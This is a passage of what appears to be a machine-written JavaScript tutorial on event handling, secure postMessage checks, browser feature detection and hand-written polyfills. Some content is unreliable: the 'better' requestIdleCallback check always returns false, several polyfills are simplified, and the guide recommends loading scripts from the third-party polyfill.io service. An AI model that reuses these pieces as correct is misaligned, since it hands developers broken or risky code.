    element.addEventListener('click', (e) => this.handleClick(e));
  }
}
```

**Explicit binding:**

```javascript
class Component {
  constructor() {
    this.handleClick = this.handleClick.bind(this);
    element.addEventListener('click', this.handleClick);
  }
}
```

**Removal requirements:**

- Store bound function reference for `removeEventListener`
- Arrow functions in constructor create new instances
- Class properties with arrow functions maintain instance reference

### Preventing Default Behavior Safely

`preventDefault()` blocks browser default actions, but misuse causes accessibility and UX issues.

**Safe usage guidelines:**

- Only prevent when replacing default with equivalent functionality
- Preserve keyboard navigation (Tab, Enter, Space, Arrows)
- Maintain focus management
- Provide visual feedback for prevented actions
- Document why default is prevented

**Common pitfalls:**

```javascript
// PROBLEMATIC: Breaks form submission
form.addEventListener('submit', (e) => {
  e.preventDefault();
  // If validation/handling fails, form is stuck
});

// BETTER: Conditional prevention
form.addEventListener('submit', (e) => {
  if (!validate(form)) {
    e.preventDefault();
    showErrors();
  }
  // Allow default submission if valid
});
```

### Async Event Handler Pitfalls

Async handlers introduce timing issues and error handling complexity.

**Problems:**

- Errors become unhandled rejections
- Multiple invocations before completion
- State changes during await periods
- Resource cleanup timing

**Safe async handler pattern:**

```javascript
let processing = false;

element.addEventListener('click', async (e) => {
  if (processing) return; // Prevent concurrent execution
  processing = true;
  
  try {
    e.target.disabled = true; // UI feedback
    await performAsyncOperation();
  } catch (error) {
    handleError(error);
  } finally {
    e.target.disabled = false;
    processing = false;
  }
});
```

### Event Timing Attacks

Malicious actors can infer sensitive information through event timing analysis.

**Vulnerability vectors:**

- Keystroke timing revealing passwords
- Network timing leaking data presence
- Computation time exposing cryptographic keys
- Animation timing indicating internal state

**Mitigation techniques:**

- Add random delays to timing-sensitive operations [Inference]
- Batch operations to obscure individual timings
- Use constant-time algorithms for sensitive comparisons
- Implement rate limiting on event handlers
- Monitor for unusual timing patterns

**[Unverified]** The effectiveness of timing obfuscation varies based on attacker capabilities and implementation details.

### Cross-Frame Event Security

Events crossing frame boundaries introduce security risks with `postMessage` and cross-origin contexts.

**Secure postMessage pattern:**

```javascript
// Sender
targetWindow.postMessage(data, 'https://trusted-origin.com');

// Receiver
window.addEventListener('message', (e) => {
  // Validate origin
  if (e.origin !== 'https://trusted-origin.com') {
    return;
  }
  
  // Validate message structure
  if (!isValidMessageFormat(e.data)) {
    return;
  }
  
  // Validate source
  if (e.source !== expectedWindow) {
    return;
  }
  
  processMessage(e.data);
});
```

**Security requirements:**

- Always validate `event.origin`
- Never use wildcard origin (`*`) for sensitive data
- Validate message structure and content
- Implement message signature/authentication for critical operations
- Use structured clone algorithm awareness for data types

### Framework-Specific Patterns

Modern frameworks provide safety mechanisms for event handling.

**React:**

- Synthetic event system normalizes browser differences
- Automatic event delegation to root
- Cleanup on component unmount
- `useEffect` cleanup functions for manual listeners

**Vue:**

- `@click.prevent` and `@click.stop` modifiers
- `v-on` directive automatic cleanup
- Event modifiers for common patterns (`.once`, `.capture`)

**Angular:**

- Template event binding with automatic unsubscription
- `HostListener` decorator for component events
- `Renderer2` for safe DOM manipulation

**[Inference]** Framework abstractions may introduce performance overhead compared to native event handling, but improve safety and maintainability in most applications.

---

# Browser Compatibility

## Feature Detection (DOM)

### Detection Methods

#### Property Existence Checking

Direct property access represents the most straightforward detection approach. Check whether a property exists on the relevant DOM object:

```javascript
if ('geolocation' in navigator) {
  // Geolocation API available
}

if ('serviceWorker' in navigator) {
  // Service Worker support present
}

if (document.createElement('canvas').getContext) {
  // Canvas support available
}
```

Property checking works for APIs exposed as properties but fails when implementation details matter beyond mere presence.

#### Method Invocation Testing

Some features require testing whether methods execute without errors:

```javascript
function supportsLocalStorage() {
  try {
    const test = '__storage_test__';
    localStorage.setItem(test, test);
    localStorage.removeItem(test);
    return true;
  } catch(e) {
    return false;
  }
}
```

Private browsing modes and security policies may block storage APIs despite their presence, making invocation tests more reliable than property checks.

#### Element Feature Detection

HTML5 elements and attributes need element-based detection:

```javascript
const input = document.createElement('input');
input.setAttribute('type', 'date');

if (input.type === 'date') {
  // Date input supported
}

// Or for specific attributes
if ('required' in input) {
  // Required attribute supported
}
```

Browsers that don't recognize input types fall back to `type="text"`, enabling comparison-based detection.

#### CSS Feature Queries

The `CSS.supports()` method tests CSS feature availability:

```javascript
if (CSS.supports('display', 'grid')) {
  // CSS Grid supported
}

if (CSS.supports('(display: flex) and (not (display: inline-grid))')) {
  // Complex queries possible
}
```

This JavaScript API mirrors CSS `@supports` rules, providing programmatic access to CSS capability detection.

### Advanced Detection Patterns

#### Feature Object Construction

Create instances to verify full implementation:

```javascript
function supportsWebGL() {
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  return !!(gl && gl instanceof WebGLRenderingContext);
}
```

Context creation confirms not just API presence but functional rendering capability.

#### Event Support Detection

Test whether specific events can be registered:

```javascript
function supportsEvent(eventName, element) {
  element = element || document.createElement('div');
  const eventNameWithPrefix = 'on' + eventName;
  let isSupported = (eventNameWithPrefix in element);
  
  if (!isSupported) {
    element.setAttribute(eventNameWithPrefix, 'return;');
    isSupported = typeof element[eventNameWithPrefix] === 'function';
  }
  
  return isSupported;
}

if (supportsEvent('touchstart')) {
  // Touch events supported
}
```

#### Media Query Matching

Detect viewport and device capabilities:

```javascript
if (window.matchMedia('(pointer: coarse)').matches) {
  // Touch-primary device
}

if (window.matchMedia('(hover: none)').matches) {
  // No hover capability
}

if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
  // User prefers reduced motion
}
```

Media queries expose hardware characteristics and user preferences beyond traditional feature detection.

### Specific Feature Detection Examples

#### Intersection Observer

```javascript
if ('IntersectionObserver' in window &&
    'IntersectionObserverEntry' in window &&
    'intersectionRatio' in IntersectionObserverEntry.prototype) {
  // Full Intersection Observer support
}
```

Multiple checks catch partial implementations during specification evolution.

#### Web Components

```javascript
function supportsWebComponents() {
  return 'customElements' in window &&
         'attachShadow' in Element.prototype &&
         'getRootNode' in Element.prototype &&
         'content' in document.createElement('template');
}
```

Web Components require several interdependent features working together.

#### Passive Event Listeners

```javascript
let passiveSupported = false;

try {
  const options = Object.defineProperty({}, 'passive', {
    get: function() {
      passiveSupported = true;
      return false;
    }
  });
  
  window.addEventListener('test', null, options);
  window.removeEventListener('test', null, options);
} catch(err) {
  passiveSupported = false;
}
```

Passive listener detection requires triggering the getter through addEventListener's options object.

#### ResizeObserver

```javascript
if ('ResizeObserver' in window) {
  const observer = new ResizeObserver(entries => {
    // Handle resize
  });
  observer.observe(element);
}
```

Constructor availability suffices since ResizeObserver has consistent implementation across supporting browsers.

### Detection Libraries vs. Manual Detection

#### Modernizr Integration

Modernizr provides comprehensive feature detection:

```javascript
if (Modernizr.flexbox) {
  // Flexbox available
}

if (Modernizr.webgl) {
  // WebGL available
}
```

The library runs tests at page load and adds classes to the `<html>` element, enabling CSS-based progressive enhancement:

```css
.no-flexbox .container {
  float: left;
}

.flexbox .container {
  display: flex;
}
```

#### Manual Detection Advantages

Direct detection offers:

- Zero external dependencies
- Smaller bundle sizes
- Precise control over test timing
- Ability to test emerging APIs not yet in libraries

#### Hybrid Approaches

Combine library detection for established features with manual checks for cutting-edge APIs:

```javascript
// Use Modernizr for standard features
if (Modernizr.webworkers) {
  // Stable API
}

// Manual detection for new APIs
if ('scheduling' in navigator && 'isInputPending' in navigator.scheduling) {
  // Emerging API not yet in Modernizr
}
```

### Performance Considerations

#### Lazy Detection

Defer detection until feature use:

```javascript
let webGLSupport = null;

function getWebGLSupport() {
  if (webGLSupport === null) {
    webGLSupport = checkWebGL();
  }
  return webGLSupport;
}

function initializeGraphics() {
  if (getWebGLSupport()) {
    // Use WebGL
  }
}
```

Caching prevents redundant tests while avoiding upfront detection cost.

#### Detection Bundling

Group related detections:

```javascript
const capabilities = {
  touch: null,
  pointer: null,
  hover: null
};

function detectInputCapabilities() {
  capabilities.touch = 'ontouchstart' in window;
  capabilities.pointer = window.matchMedia('(pointer: fine)').matches;
  capabilities.hover = window.matchMedia('(hover: hover)').matches;
  return capabilities;
}
```

Single-pass detection reduces overhead when multiple related features need checking.

#### Async Detection

Move expensive tests off the main thread:

```javascript
async function detectVideoCodecs() {
  const video = document.createElement('video');
  
  const codecs = {
    h264: video.canPlayType('video/mp4; codecs="avc1.42E01E"'),
    h265: video.canPlayType('video/mp4; codecs="hev1.1.6.L93.B0"'),
    vp9: video.canPlayType('video/webm; codecs="vp9"'),
    av1: video.canPlayType('video/mp4; codecs="av01.0.05M.08"')
  };
  
  return codecs;
}
```

### Polyfill Loading Strategies

#### Conditional Loading

Load polyfills only when needed:

```javascript
async function loadPolyfills() {
  const polyfills = [];
  
  if (!('IntersectionObserver' in window)) {
    polyfills.push(import('intersection-observer'));
  }
  
  if (!window.fetch) {
    polyfills.push(import('whatwg-fetch'));
  }
  
  await Promise.all(polyfills);
}

loadPolyfills().then(() => {
  // Initialize application
});
```

#### Dynamic Script Injection

```javascript
function loadPolyfill(url) {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = url;
    script.onload = resolve;
    script.onerror = reject;
    document.head.appendChild(script);
  });
}

if (!('IntersectionObserver' in window)) {
  loadPolyfill('/polyfills/intersection-observer.js').then(init);
} else {
  init();
}
```

#### Service-Based Polyfilling

Polyfill.io serves browser-specific bundles:

```html
<script src="https://polyfill.io/v3/polyfill.min.js?features=IntersectionObserver,fetch"></script>
```

The service detects the requesting browser and returns only necessary polyfills, reducing payload size.

### Common Pitfalls

#### False Positives

Browsers may expose APIs that don't fully work:

```javascript
// Insufficient - property exists but may not work
if ('requestIdleCallback' in window) {
  // May not behave correctly in all browsers
}

// Better - test actual behavior
function supportsIdleCallback() {
  if (!('requestIdleCallback' in window)) return false;
  
  try {
    let supported = false;
    requestIdleCallback(() => { supported = true; }, { timeout: 0 });
    return supported;
  } catch(e) {
    return false;
  }
}
```

[Inference] Testing execution behavior provides more reliable detection than property checks alone, though this adds complexity.

#### Vendor Prefixes

Older APIs require prefix checking:

```javascript
function getRequestAnimationFrame() {
  return window.requestAnimationFrame ||
         window.webkitRequestAnimationFrame ||
         window.mozRequestAnimationFrame ||
         window.oRequestAnimationFrame ||
         window.msRequestAnimationFrame ||
         function(callback) {
           window.setTimeout(callback, 1000 / 60);
         };
}

const raf = getRequestAnimationFrame();
```

Modern APIs typically avoid prefixes, but legacy prefix handling remains necessary for older browser support.

#### Privacy-Impacting Features

Feature detection can reveal user characteristics:

```javascript
// Battery status removed from many browsers due to fingerprinting
if ('getBattery' in navigator) {
  // Available but privacy-sensitive
}

// Canvas fingerprinting possible through feature support patterns
const canvas = document.createElement('canvas');
const gl = canvas.getContext('webgl');
// Analyzing available extensions reveals GPU info
```

[Unverified] Privacy concerns have led browsers to remove or restrict some detection mechanisms.

### Detection Timing

#### DOMContentLoaded vs. Load

```javascript
// Early detection - DOM ready
document.addEventListener('DOMContentLoaded', () => {
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js');
  }
});

// Later detection - all resources loaded
window.addEventListener('load', () => {
  // More expensive tests after initial render
  detectVideoCodecs();
});
```

#### Immediate Execution

Some detection must run synchronously:

```javascript
(function() {
  // Detect before any DOM interaction
  const hasTouch = 'ontouchstart' in window;
  
  if (hasTouch) {
    document.documentElement.classList.add('touch');
  } else {
    document.documentElement.classList.add('no-touch');
  }
})();
```

Immediate detection prevents layout shifts when applying CSS based on capabilities.

### Testing Detection Logic

#### Unit Testing

```javascript
describe('Feature Detection', () => {
  it('should detect IntersectionObserver', () => {
    if ('IntersectionObserver' in window) {
      expect(detectIntersectionObserver()).toBe(true);
    } else {
      expect(detectIntersectionObserver()).toBe(false);
    }
  });
  
  it('should handle missing features gracefully', () => {
    const originalIO = window.IntersectionObserver;
    delete window.IntersectionObserver;
    
    expect(detectIntersectionObserver()).toBe(false);
    
    window.IntersectionObserver = originalIO;
  });
});
```

#### Cross-Browser Testing

Automated testing across browsers validates detection accuracy:

```javascript
// BrowserStack, Sauce Labs, or similar
const browsers = [
  'chrome_latest',
  'firefox_latest',
  'safari_latest',
  'edge_latest',
  'ie_11'
];

browsers.forEach(browser => {
  test(`Feature detection works in ${browser}`, async () => {
    const result = await runInBrowser(browser, detectFeatures);
    expect(result).toMatchSnapshot();
  });
});
```

### Progressive Enhancement Patterns

#### Layered Enhancement

```javascript
class ImageGallery {
  constructor(element) {
    this.element = element;
    this.initBasic();
    
    if ('IntersectionObserver' in window) {
      this.initLazyLoading();
    }
    
    if ('loading' in HTMLImageElement.prototype) {
      this.initNativeLazyLoading();
    }
    
    if (window.matchMedia('(hover: hover)').matches) {
      this.initHoverEffects();
    }
  }
  
  initBasic() {
    // Core functionality works everywhere
  }
  
  initLazyLoading() {
    // Enhanced loading with IntersectionObserver
  }
  
  initNativeLazyLoading() {
    // Use native lazy loading when available
  }
  
  initHoverEffects() {
    // Only add hover effects on hover-capable devices
  }
}
```

#### Graceful Degradation

```javascript
function setupVideoPlayer(element) {
  const video = element.querySelector('video');
  
  // Basic HTML5 video
  video.controls = true;
  
  // Enhanced controls if APIs available
  if ('pictureInPictureEnabled' in document) {
    addPiPButton(video);
  }
  
  if ('mediaSession' in navigator) {
    setupMediaSession(video);
  }
  
  // Fullscreen with vendor prefixes
  if (video.requestFullscreen) {
    addFullscreenButton(video);
  } else if (video.webkitRequestFullscreen) {
    addFullscreenButton(video, 'webkit');
  } else if (video.mozRequestFullScreen) {
    addFullscreenButton(video, 'moz');
  }
}
```

Each enhancement layer adds functionality without breaking core features in less-capable browsers.

---

## Polyfills in JavaScript and DOM APIs

### What Polyfills Are

Polyfills are code implementations that provide modern functionality in older environments that lack native support. They detect missing features and implement equivalent behavior using available primitives, allowing developers to use newer APIs while maintaining backward compatibility.

### Detection Pattern

Polyfills follow a standard detection-before-implementation pattern:

```javascript
if (!Array.prototype.includes) {
  Array.prototype.includes = function(searchElement, fromIndex) {
    // Implementation
  };
}
```

This prevents overwriting native implementations and ensures polyfills only run when necessary.

### Core JavaScript Polyfills

#### Array Methods

**Array.prototype.includes**

Searches for an element using SameValueZero comparison:

```javascript
if (!Array.prototype.includes) {
  Array.prototype.includes = function(searchElement, fromIndex) {
    var O = Object(this);
    var len = parseInt(O.length) || 0;
    if (len === 0) return false;
    
    var n = parseInt(fromIndex) || 0;
    var k = Math.max(n >= 0 ? n : len - Math.abs(n), 0);
    
    while (k < len) {
      if (sameValueZero(O[k], searchElement)) return true;
      k++;
    }
    return false;
    
    function sameValueZero(x, y) {
      return x === y || (typeof x === 'number' && typeof y === 'number' && isNaN(x) && isNaN(y));
    }
  };
}
```

**Array.prototype.find / findIndex**

Locate elements matching predicates:

```javascript
if (!Array.prototype.find) {
  Array.prototype.find = function(predicate, thisArg) {
    var list = Object(this);
    var length = list.length >>> 0;
    var value;
    
    for (var i = 0; i < length; i++) {
      value = list[i];
      if (predicate.call(thisArg, value, i, list)) {
        return value;
      }
    }
    return undefined;
  };
}
```

**Array.from**

Creates arrays from array-like or iterable objects:

```javascript
if (!Array.from) {
  Array.from = function(arrayLike, mapFn, thisArg) {
    var C = this;
    var items = Object(arrayLike);
    
    if (arrayLike == null) {
      throw new TypeError('Array.from requires an array-like object');
    }
    
    var mapFunction = arguments.length > 1 ? mapFn : undefined;
    var T;
    if (typeof mapFunction !== 'undefined') {
      if (typeof mapFunction !== 'function') {
        throw new TypeError('Array.from: when provided, the second argument must be a function');
      }
      if (arguments.length > 2) {
        T = thisArg;
      }
    }
    
    var len = parseInt(items.length) || 0;
    var A = typeof C === 'function' ? Object(new C(len)) : new Array(len);
    var k = 0;
    var kValue;
    
    while (k < len) {
      kValue = items[k];
      if (mapFunction) {
        A[k] = typeof T === 'undefined' ? mapFunction(kValue, k) : mapFunction.call(T, kValue, k);
      } else {
        A[k] = kValue;
      }
      k++;
    }
    A.length = len;
    return A;
  };
}
```

#### Object Methods

**Object.assign**

Shallow-copies enumerable own properties:

```javascript
if (typeof Object.assign !== 'function') {
  Object.assign = function(target) {
    if (target == null) {
      throw new TypeError('Cannot convert undefined or null to object');
    }
    
    var to = Object(target);
    
    for (var i = 1; i < arguments.length; i++) {
      var nextSource = arguments[i];
      
      if (nextSource != null) {
        for (var nextKey in nextSource) {
          if (Object.prototype.hasOwnProperty.call(nextSource, nextKey)) {
            to[nextKey] = nextSource[nextKey];
          }
        }
      }
    }
    return to;
  };
}
```

**Object.keys / values / entries**

Extract object properties:

```javascript
if (!Object.keys) {
  Object.keys = function(obj) {
    var keys = [];
    for (var key in obj) {
      if (Object.prototype.hasOwnProperty.call(obj, key)) {
        keys.push(key);
      }
    }
    return keys;
  };
}

if (!Object.values) {
  Object.values = function(obj) {
    var values = [];
    for (var key in obj) {
      if (Object.prototype.hasOwnProperty.call(obj, key)) {
        values.push(obj[key]);
      }
    }
    return values;
  };
}

if (!Object.entries) {
  Object.entries = function(obj) {
    var entries = [];
    for (var key in obj) {
      if (Object.prototype.hasOwnProperty.call(obj, key)) {
        entries.push([key, obj[key]]);
      }
    }
    return entries;
  };
}
```

#### String Methods

**String.prototype.startsWith / endsWith / includes**

```javascript
if (!String.prototype.startsWith) {
  String.prototype.startsWith = function(search, pos) {
    pos = !pos || pos < 0 ? 0 : +pos;
    return this.substring(pos, pos + search.length) === search;
  };
}

if (!String.prototype.endsWith) {
  String.prototype.endsWith = function(search, this_len) {
    if (this_len === undefined || this_len > this.length) {
      this_len = this.length;
    }
    return this.substring(this_len - search.length, this_len) === search;
  };
}

if (!String.prototype.includes) {
  String.prototype.includes = function(search, start) {
    if (typeof start !== 'number') {
      start = 0;
    }
    if (start + search.length > this.length) {
      return false;
    }
    return this.indexOf(search, start) !== -1;
  };
}
```

**String.prototype.repeat**

```javascript
if (!String.prototype.repeat) {
  String.prototype.repeat = function(count) {
    if (this == null) throw new TypeError();
    var str = '' + this;
    count = +count;
    if (count != count) count = 0;
    if (count < 0) throw new RangeError();
    if (count == Infinity) throw new RangeError();
    count = Math.floor(count);
    if (str.length == 0 || count == 0) return '';
    
    if (str.length * count >= 1 << 28) {
      throw new RangeError();
    }
    
    var result = '';
    while (true) {
      if ((count & 1) == 1) result += str;
      count >>>= 1;
      if (count == 0) break;
      str += str;
    }
    return result;
  };
}
```

#### Promise

Full Promise/A+ implementation:

```javascript
if (typeof Promise === 'undefined') {
  (function() {
    var PENDING = 0;
    var FULFILLED = 1;
    var REJECTED = 2;
    
    function Promise(executor) {
      if (typeof this !== 'object') {
        throw new TypeError('Promises must be constructed via new');
      }
      if (typeof executor !== 'function') {
        throw new TypeError('Promise resolver is not a function');
      }
      
      this._state = PENDING;
      this._value = undefined;
      this._deferreds = [];
      
      doResolve(executor, this);
    }
    
    function handle(self, deferred) {
      while (self._state === 3) {
        self = self._value;
      }
      
      if (self._state === PENDING) {
        self._deferreds.push(deferred);
        return;
      }
      
      var cb = self._state === FULFILLED ? deferred.onFulfilled : deferred.onRejected;
      
      if (cb === null) {
        (self._state === FULFILLED ? resolve : reject)(deferred.promise, self._value);
        return;
      }
      
      var ret;
      try {
        ret = cb(self._value);
      } catch (e) {
        reject(deferred.promise, e);
        return;
      }
      resolve(deferred.promise, ret);
    }
    
    function resolve(self, newValue) {
      try {
        if (newValue === self) {
          throw new TypeError('A promise cannot be resolved with itself.');
        }
        if (newValue && (typeof newValue === 'object' || typeof newValue === 'function')) {
          var then = newValue.then;
          if (newValue instanceof Promise) {
            self._state = 3;
            self._value = newValue;
            finale(self);
            return;
          } else if (typeof then === 'function') {
            doResolve(then.bind(newValue), self);
            return;
          }
        }
        self._state = FULFILLED;
        self._value = newValue;
        finale(self);
      } catch (e) {
        reject(self, e);
      }
    }
    
    function reject(self, newValue) {
      self._state = REJECTED;
      self._value = newValue;
      finale(self);
    }
    
    function finale(self) {
      for (var i = 0; i < self._deferreds.length; i++) {
        handle(self, self._deferreds[i]);
      }
      self._deferreds = null;
    }
    
    function Handler(onFulfilled, onRejected, promise) {
      this.onFulfilled = typeof onFulfilled === 'function' ? onFulfilled : null;
      this.onRejected = typeof onRejected === 'function' ? onRejected : null;
      this.promise = promise;
    }
    
    function doResolve(fn, self) {
      var done = false;
      try {
        fn(function(value) {
          if (done) return;
          done = true;
          resolve(self, value);
        }, function(reason) {
          if (done) return;
          done = true;
          reject(self, reason);
        });
      } catch (ex) {
        if (done) return;
        done = true;
        reject(self, ex);
      }
    }
    
    Promise.prototype.then = function(onFulfilled, onRejected) {
      var prom = new Promise(function() {});
      handle(this, new Handler(onFulfilled, onRejected, prom));
      return prom;
    };
    
    Promise.prototype.catch = function(onRejected) {
      return this.then(null, onRejected);
    };
    
    Promise.all = function(arr) {
      return new Promise(function(resolve, reject) {
        if (!Array.isArray(arr)) {
          return reject(new TypeError('Promise.all accepts an array'));
        }
        
        var args = Array.prototype.slice.call(arr);
        if (args.length === 0) return resolve([]);
        var remaining = args.length;
        
        function res(i, val) {
          try {
            if (val && (typeof val === 'object' || typeof val === 'function')) {
              var then = val.then;
              if (typeof then === 'function') {
                then.call(val, function(val) {
                  res(i, val);
                }, reject);
                return;
              }
            }
            args[i] = val;
            if (--remaining === 0) {
              resolve(args);
            }
          } catch (ex) {
            reject(ex);
          }
        }
        
        for (var i = 0; i < args.length; i++) {
          res(i, args[i]);
        }
      });
    };
    
    Promise.resolve = function(value) {
      if (value && typeof value === 'object' && value.constructor === Promise) {
        return value;
      }
      return new Promise(function(resolve) {
        resolve(value);
      });
    };
    
    Promise.reject = function(value) {
      return new Promise(function(resolve, reject) {
        reject(value);
      });
    };
    
    Promise.race = function(values) {
      return new Promise(function(resolve, reject) {
        for (var i = 0; i < values.length; i++) {
          values[i].then(resolve, reject);
        }
      });
    };
    
    window.Promise = Promise;
  })();
}
```

### DOM API Polyfills

#### Element.classList

Manipulates CSS classes on elements:

```javascript
if (!('classList' in document.documentElement)) {
  Object.defineProperty(Element.prototype, 'classList', {
    get: function() {
      var element = this;
      var classNames = (element.className || '').replace(/^\s+|\s+$/g, '').split(/\s+/);
      if (classNames[0] === '') classNames.shift();
      
      function update() {
        element.className = classNames.join(' ');
      }
      
      var classList = {
        length: classNames.length,
        item: function(i) {
          return classNames[i] || null;
        },
        contains: function(className) {
          return classNames.indexOf(className) !== -1;
        },
        add: function() {
          for (var i = 0; i < arguments.length; i++) {
            var className = arguments[i];
            if (classNames.indexOf(className) === -1) {
              classNames.push(className);
            }
          }
          update();
        },
        remove: function() {
          for (var i = 0; i < arguments.length; i++) {
            var className = arguments[i];
            var index = classNames.indexOf(className);
            if (index !== -1) {
              classNames.splice(index, 1);
            }
          }
          update();
        },
        toggle: function(className, force) {
          var hasClass = classNames.indexOf(className) !== -1;
          if (force !== undefined) {
            if (force) {
              if (!hasClass) classNames.push(className);
            } else {
              if (hasClass) classNames.splice(classNames.indexOf(className), 1);
            }
          } else {
            if (hasClass) {
              classNames.splice(classNames.indexOf(className), 1);
            } else {
              classNames.push(className);
            }
          }
          update();
          return classNames.indexOf(className) !== -1;
        }
      };
      
      return classList;
    }
  });
}
```

#### Element.closest

Traverses ancestors to find matching selector:

```javascript
if (!Element.prototype.closest) {
  Element.prototype.closest = function(selector) {
    var el = this;
    if (!document.documentElement.contains(el)) return null;
    
    do {
      if (el.matches(selector)) return el;
      el = el.parentElement || el.parentNode;
    } while (el !== null && el.nodeType === 1);
    
    return null;
  };
}
```

#### Element.matches

Tests if element matches selector:

```javascript
if (!Element.prototype.matches) {
  Element.prototype.matches = 
    Element.prototype.matchesSelector ||
    Element.prototype.mozMatchesSelector ||
    Element.prototype.msMatchesSelector ||
    Element.prototype.oMatchesSelector ||
    Element.prototype.webkitMatchesSelector ||
    function(s) {
      var matches = (this.document || this.ownerDocument).querySelectorAll(s);
      var i = matches.length;
      while (--i >= 0 && matches.item(i) !== this) {}
      return i > -1;
    };
}
```

#### CustomEvent

Creates custom events with detail data:

```javascript
if (typeof window.CustomEvent !== 'function') {
  function CustomEvent(event, params) {
    params = params || { bubbles: false, cancelable: false, detail: null };
    var evt = document.createEvent('CustomEvent');
    evt.initCustomEvent(event, params.bubbles, params.cancelable, params.detail);
    return evt;
  }
  
  CustomEvent.prototype = window.Event.prototype;
  window.CustomEvent = CustomEvent;
}
```

#### Element.remove

Removes element from DOM:

```javascript
if (!('remove' in Element.prototype)) {
  Element.prototype.remove = function() {
    if (this.parentNode) {
      this.parentNode.removeChild(this);
    }
  };
}
```

#### Element.append / prepend

Adds nodes or strings to element:

```javascript
if (!Element.prototype.append) {
  Element.prototype.append = function() {
    var argArr = Array.prototype.slice.call(arguments);
    var docFrag = document.createDocumentFragment();
    
    argArr.forEach(function(argItem) {
      var isNode = argItem instanceof Node;
      docFrag.appendChild(isNode ? argItem : document.createTextNode(String(argItem)));
    });
    
    this.appendChild(docFrag);
  };
}

if (!Element.prototype.prepend) {
  Element.prototype.prepend = function() {
    var argArr = Array.prototype.slice.call(arguments);
    var docFrag = document.createDocumentFragment();
    
    argArr.forEach(function(argItem) {
      var isNode = argItem instanceof Node;
      docFrag.appendChild(isNode ? argItem : document.createTextNode(String(argItem)));
    });
    
    this.insertBefore(docFrag, this.firstChild);
  };
}
```

#### NodeList.forEach

Iterates over NodeList:

```javascript
if (window.NodeList && !NodeList.prototype.forEach) {
  NodeList.prototype.forEach = Array.prototype.forEach;
}
```

#### requestAnimationFrame

Frame-based animation timing:

```javascript
(function() {
  var lastTime = 0;
  var vendors = ['ms', 'moz', 'webkit', 'o'];
  
  for (var x = 0; x < vendors.length && !window.requestAnimationFrame; ++x) {
    window.requestAnimationFrame = window[vendors[x] + 'RequestAnimationFrame'];
    window.cancelAnimationFrame = window[vendors[x] + 'CancelAnimationFrame'] ||
                                   window[vendors[x] + 'CancelRequestAnimationFrame'];
  }
  
  if (!window.requestAnimationFrame) {
    window.requestAnimationFrame = function(callback) {
      var currTime = new Date().getTime();
      var timeToCall = Math.max(0, 16 - (currTime - lastTime));
      var id = window.setTimeout(function() {
        callback(currTime + timeToCall);
      }, timeToCall);
      lastTime = currTime + timeToCall;
      return id;
    };
  }
  
  if (!window.cancelAnimationFrame) {
    window.cancelAnimationFrame = function(id) {
      clearTimeout(id);
    };
  }
})();
```

#### window.fetch

Network requests with Promise-based API:

```javascript
if (!window.fetch) {
  window.fetch = function(url, options) {
    return new Promise(function(resolve, reject) {
      var xhr = new XMLHttpRequest();
      options = options || {};
      
      xhr.open(options.method || 'GET', url, true);
      
      if (options.headers) {
        Object.keys(options.headers).forEach(function(key) {
          xhr.setRequestHeader(key, options.headers[key]);
        });
      }
      
      xhr.onload = function() {
        var response = {
          ok: xhr.status >= 200 && xhr.status < 300,
          status: xhr.status,
          statusText: xhr.statusText,
          url: xhr.responseURL,
          text: function() {
            return Promise.resolve(xhr.responseText);
          },
          json: function() {
            return Promise.resolve(JSON.parse(xhr.responseText));
          },
          blob: function() {
            return Promise.resolve(new Blob([xhr.response]));
          },
          arrayBuffer: function() {
            return Promise.resolve(xhr.response);
          }
        };
        resolve(response);
      };
      
      xhr.onerror = function() {
        reject(new TypeError('Network request failed'));
      };
      
      xhr.ontimeout = function() {
        reject(new TypeError('Network request timed out'));
      };
      
      xhr.send(options.body || null);
    });
  };
}
```

### Modern API Polyfills

#### Intersection Observer

Detects element visibility in viewport:

```javascript
if (!('IntersectionObserver' in window)) {
  window.IntersectionObserver = function(callback, options) {
    options = options || {};
    this.callback = callback;
    this.root = options.root || null;
    this.rootMargin = options.rootMargin || '0px';
    this.thresholds = options.threshold || [0];
    this.observedElements = [];
    
    this.checkIntersections = function() {
      var entries = [];
      this.observedElements.forEach(function(el) {
        var rect = el.getBoundingClientRect();
        var rootRect = this.root ? this.root.getBoundingClientRect() : {
          top: 0,
          left: 0,
          bottom: window.innerHeight,
          right: window.innerWidth
        };
        
        var isIntersecting = !(
          rect.bottom < rootRect.top ||
          rect.top > rootRect.bottom ||
          rect.right < rootRect.left ||
          rect.left > rootRect.right
        );
        
        entries.push({
          target: el,
          isIntersecting: isIntersecting,
          intersectionRatio: isIntersecting ? 1 : 0,
          boundingClientRect: rect,
          rootBounds: rootRect,
          time: Date.now()
        });
      }.bind(this));
      
      if (entries.length > 0) {
        this.callback(entries, this);
      }
    }.bind(this);
    
    this.intervalId = setInterval(this.checkIntersections, 100);
  };
  
  window.IntersectionObserver.prototype.observe = function(element) {
    if (this.observedElements.indexOf(element) === -1) {
      this.observedElements.push(element);
    }
  };
  
  window.IntersectionObserver.prototype.unobserve = function(element) {
    var index = this.observedElements.indexOf(element);
    if (index !== -1) {
      this.observedElements.splice(index, 1);
    }
  };
  
  window.IntersectionObserver.prototype.disconnect = function() {
    clearInterval(this.intervalId);
    this.observedElements = [];
  };
}
```

#### ResizeObserver

Monitors element size changes:

```javascript
if (!window.ResizeObserver) {
  window.ResizeObserver = function(callback) {
    this.callback = callback;
    this.observedElements = new Map();
    
    this.checkSizes = function() {
      var entries = [];
      this.observedElements.forEach(function(lastSize, element) {
        var rect = element.getBoundingClientRect();
        var currentSize = { width: rect.width, height: rect.height };
        
        if (lastSize.width !== currentSize.width || lastSize.height !== currentSize.height) {
          entries.push({
            target: element,
            contentRect: rect
          });
          this.observedElements.set(element, currentSize);
        }
      }.bind(this));
      
      if (entries.length > 0) {
        this.callback(entries, this);
      }
    }.bind(this);
    
    this.intervalId = setInterval(this.checkSizes, 100);
  };
  
  window.ResizeObserver.prototype.observe = function(element) {
    var rect = element.getBoundingClientRect();
    this.observedElements.set(element, { width: rect.width, height: rect.height });
  };
  
  window.ResizeObserver.prototype.unobserve = function(element) {
    this.observedElements.delete(element);
  };
  
  window.ResizeObserver.prototype.disconnect = function() {
    clearInterval(this.intervalId);
    this.observedElements.clear();
  };
}
```

### Polyfill Loading Strategies

#### Conditional Loading

Load polyfills only when needed:

```javascript
function loadPolyfill(test, url, callback) {
  if (test) {
